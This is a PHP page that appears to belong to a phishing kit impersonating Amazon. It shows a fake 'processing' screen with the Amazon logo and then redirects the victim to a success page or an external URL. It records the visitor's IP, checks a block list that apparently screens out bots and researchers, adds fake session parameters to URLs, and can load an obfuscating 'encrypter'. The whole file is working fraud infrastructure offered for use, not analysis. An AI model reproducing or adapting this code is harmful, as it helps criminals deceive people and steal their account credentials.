<?php
error_reporting(0);
@ob_start();
session_start();
session_set_cookie_params(0);

if(!isset($_SESSION['SESSION_ID']))
{
	header("location: index.php");	
	exit;
}

require_once 'inc/check_blocked.php'; 
include_once 'inc/config.php';

if(!isset($_SESSION['IP'])) {
	include_once('inc/functions.php');
	$_SESSION['IP'] = get_client_ip();
}

$_GET = array();
  $params = explode('&', $_SERVER['QUERY_STRING']);
  foreach ($params as $pair) {
    list($key, $value) = explode('=', $pair);
    $_GET[urldecode($key)] = urldecode($value);
}

$session = isset($_GET['sessionid']) ? $_GET['sessionid'] : '';
$fake_session_params = "processing.php?loggedin=1&header=1&sessionid=".$session;

if(!isset($_SESSION['LANG'])) {
	if($dynamic_language) {
		$_SESSION['LANG'] = getBrowserLanguage(substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2));
	} else {
		$_SESSION['LANG'] = $default_language.'.php';
	}
}

require_once 'languages/'.$_SESSION['LANG'];
?>

<!DOCTYPE HTML>
<html>
<head>
<?php 
if(!$enable_encrypter) {
    require_once 'inc/encrypter.php'; 
}
?>
<meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
<title><?php echo $lang['PROCESSING_TITLE']; ?></title>
<link rel="shortcut icon" href="assets/imgs/favicon.ico">
<link media="all" href="assets/css/style2.css?sessionid=<?php echo $fake_session_params;?>" type="text/css" rel="stylesheet">
</head>
<body>
    <?php 
        if(!$disable_processing_page) {
            echo '<table align="center" width="620" cellspacing="0" cellpadding="0" border="0">';
            echo '<tbody><tr>';
            echo '<td>';
            echo '<img src="assets/imgs/l.png" alt="Amazon.com"  border="0">';
            echo '</td>';
            echo '</tr>';
            echo '</tbody></table>';
            echo '<br><br>';
            echo '<table style="padding-top: 40px;" align="center" height="225" width="620" cellspacing="0" cellpadding="2" border="0">';
            echo '<tbody><tr>';
            echo '<td>';
            echo '<div style="padding-bottom: 10px;">';
            echo '<div class="dsv-cBox dsv-secondary">';
            echo '<span class="dsv-cBoxTL"><!-- &nbsp; --></span>';
            echo '<span class="dsv-cBoxTR"><!-- &nbsp; --></span>';
            echo '<span class="dsv-cBoxR"><!-- &nbsp; --></span>';
            echo '<span class="dsv-cBoxBL"><!-- &nbsp; --></span>';
            echo '<span class="dsv-cBoxBR"><!-- &nbsp; --></span>';
            echo '<span class="dsv-cBoxB"><!-- &nbsp; --></span>';
            echo '<div class="dsv-cBoxInner" style="padding: 7px;">';
            echo '<table style="background-color: rgb(255, 255, 255);" width="600" cellspacing="0" cellpadding="0">';
            echo '<tbody><tr>';
            echo '<td>';
            echo '<div style="padding-top: 0px; padding-bottom: 0px;" align="center">';
            echo '<div style="padding-top: 45px;">';
            echo '<span class="dsv-wfw-title">'.$lang['PROCESSING_NOTE'];
            echo '<div style="padding-top: 13px;">';
            echo $lang['PROCESSING_NOTE2'];
            echo '</div>';
            echo '</div>';
            echo '</td>';
            echo '</tr>';
            echo '<tr>';
            echo '<td>';
            echo '<div style="padding-top: 25px;" align="center">';
            echo '<div id="loading"> </div>';
            echo '<img src="assets/imgs/loading.gif" height="52" width="52" border="0">';
            echo '</div>';
            echo '</td>';
            echo '</tr>';
            echo '<tr>';
            echo '<td><div style="height: 25px;">&nbsp;</div></td>';
            echo '</tr>';
            echo '</tbody></table>';
            echo '</div>';
            echo '</div>';
            echo '</div>';
            echo '</td>';
            echo '</tr>';
            echo '</tbody></table>';
            echo '<a href="#"></a>';
            if(!$disable_confirmation_page) {
                header("refresh:5; url=success.php?loggedin=true&en=".uniqid($_SESSION['SESSION_ID'], false));
                ob_end_flush();
                exit;
            } else if($final_redirect_url !== '') {
                session_destroy();
                exit(header("refresh:5; url=$final_redirect_url"));
            } else {
                ob_end_flush();
                exit;
            }
        }
    ?>
                    
</body>
</html>
<?php ob_end_flush(); ?>
